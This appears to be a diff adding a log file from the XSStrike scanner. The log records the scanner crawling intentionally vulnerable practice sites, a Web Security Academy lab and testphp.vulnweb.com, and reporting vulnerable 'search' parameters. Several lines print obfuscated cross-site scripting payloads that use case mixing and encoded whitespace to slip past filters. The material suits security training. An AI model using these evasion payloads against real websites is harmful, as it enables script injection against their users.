@@ -1,0 +1,76 @@
+2024-06-30 21:10:44,697 xsstrike - RUN - Crawling the target
+2024-06-30 21:10:44,703 core.photon - RUN - Parsing search.php?test=query                   
+2024-06-30 21:10:44,709 xsstrike - RUN - Crawling the target
+2024-06-30 21:10:44,721 core.photon - RUN - Parsing Templatize.asp?item=html/about.html     
+2024-06-30 21:10:44,744 xsstrike - RUN - Crawling the target
+2024-06-30 21:10:44,753 core.photon - RUN - Parsing showforum.asp?id=1                      
+2024-06-30 21:10:44,792 xsstrike - RUN - Crawling the target
+2024-06-30 21:10:44,793 core.photon - RUN - Parsing ?search=a                               
+2024-06-30 21:10:47,256 xsstrike - INFO - Progress: 2/2
+
+2024-06-30 21:10:52,039 modes.crawl - VULN - Vulnerable webpage: [92mhttps://0a1f003d04b0a8b180d5bcdf00c700af.web-security-academy.net/[0m
+2024-06-30 21:10:52,040 modes.crawl - VULN - Vector for [92msearch[0m: <D3v%09onpOINteRentER%09=%09confirm()%0dx//v3dm0s
+2024-06-30 21:10:52,041 xsstrike - INFO - Progress: 2/2
+
+2024-06-30 21:10:55,597 core.requester - WARNING - Unable to connect to the target.
+2024-06-30 21:10:55,886 core.requester - WARNING - Unable to connect to the target.
+2024-06-30 21:11:05,990 core.requester - WARNING - Unable to connect to the target.
+2024-06-30 21:11:06,199 core.requester - WARNING - Unable to connect to the target.
+2024-06-30 21:11:16,347 core.requester - WARNING - Unable to connect to the target.
+2024-06-30 21:11:16,505 core.requester - WARNING - Unable to connect to the target.
+2024-06-30 21:11:26,661 core.requester - WARNING - Unable to connect to the target.
+2024-06-30 21:11:26,662 xsstrike - INFO - Progress: 2/2
+
+2024-06-30 21:11:26,883 core.requester - WARNING - Unable to connect to the target.
+2024-06-30 21:11:26,893 xsstrike - INFO - Progress: 2/2
+
+2024-06-30 21:15:54,844 xsstrike - RUN - Crawling the target
+2024-06-30 21:15:54,873 core.photon - RUN - Parsing ?search=a                               
+2024-06-30 21:15:54,975 xsstrike - RUN - Crawling the target
+2024-06-30 21:15:54,977 core.photon - RUN - Parsing showforum.asp?id=1                      
+2024-06-30 21:15:55,024 xsstrike - RUN - Crawling the target
+2024-06-30 21:15:55,026 core.photon - RUN - Parsing search.php?test=query                   
+2024-06-30 21:15:55,057 xsstrike - RUN - Crawling the target
+2024-06-30 21:15:55,058 core.photon - RUN - Parsing Templatize.asp?item=html/about.html     
+2024-06-30 21:16:01,176 modes.crawl - VULN - Vulnerable webpage: [92mhttps://0a1f003d04b0a8b180d5bcdf00c700af.web-security-academy.net/[0m
+2024-06-30 21:16:01,177 modes.crawl - VULN - Vector for [92msearch[0m: <D3V%0dOnpOiNterEnTER%09=%09(confirm)()%0dx//v3dm0s
+2024-06-30 21:16:01,180 xsstrike - INFO - Progress: 2/2
+
+2024-06-30 21:16:05,247 core.requester - WARNING - Unable to connect to the target.
+2024-06-30 21:16:05,308 core.requester - WARNING - Unable to connect to the target.
+2024-06-30 21:16:05,330 core.requester - WARNING - Unable to connect to the target.
+2024-06-30 21:16:15,520 core.requester - WARNING - Unable to connect to the target.
+2024-06-30 21:16:15,582 core.requester - WARNING - Unable to connect to the target.
+2024-06-30 21:16:15,620 core.requester - WARNING - Unable to connect to the target.
+2024-06-30 21:16:25,806 core.requester - WARNING - Unable to connect to the target.
+2024-06-30 21:16:25,873 core.requester - WARNING - Unable to connect to the target.
+2024-06-30 21:16:25,925 core.requester - WARNING - Unable to connect to the target.
+2024-06-30 21:16:36,138 core.requester - WARNING - Unable to connect to the target.
+2024-06-30 21:16:36,142 xsstrike - INFO - Progress: 2/2
+
+2024-06-30 21:16:36,300 core.requester - WARNING - Unable to connect to the target.
+2024-06-30 21:16:36,301 xsstrike - INFO - Progress: 2/2
+
+2024-06-30 21:16:36,347 core.requester - WARNING - Unable to connect to the target.
+2024-06-30 21:16:36,348 xsstrike - INFO - Progress: 2/2
+
+2024-06-30 21:23:09,546 xsstrike - RUN - Crawling the target
+2024-06-30 21:23:09,550 core.photon - RUN - Parsing Templatize.asp?item=html/about.html     
+2024-06-30 21:23:09,627 xsstrike - RUN - Crawling the target
+2024-06-30 21:23:09,643 core.photon - RUN - Parsing ?search=a                               
+2024-06-30 21:23:09,660 xsstrike - RUN - Crawling the target
+2024-06-30 21:23:09,667 core.photon - RUN - Parsing showforum.asp?id=1                      
+2024-06-30 21:23:09,685 xsstrike - RUN - Crawling the target
+2024-06-30 21:23:09,689 core.photon - RUN - Parsing search.php?test=query                   
+2024-06-30 21:23:11,817 xsstrike - INFO - Progress: 2/2
+
+2024-06-30 21:23:11,893 xsstrike - INFO - Progress: 2/2
+
+2024-06-30 21:23:12,017 modes.crawl - VULN - Vulnerable webpage: [92mhttp://testphp.vulnweb.com/search.php?test=query[0m
+2024-06-30 21:23:12,018 modes.crawl - VULN - Vector for [92msearchFor[0m: <A%0aOnpOinterentEr+=+(prompt)``%0dx>v3dm0s
+2024-06-30 21:23:13,547 xsstrike - INFO - Progress: 2/2
+
+2024-06-30 21:23:16,272 modes.crawl - VULN - Vulnerable webpage: [92mhttps://0a1f003d04b0a8b180d5bcdf00c700af.web-security-academy.net/[0m
+2024-06-30 21:23:16,272 modes.crawl - VULN - Vector for [92msearch[0m: <D3v/+/ONPOIntERentEr%0d=%0d(prompt)``//v3dm0s
+2024-06-30 21:23:16,272 xsstrike - INFO - Progress: 2/2
+
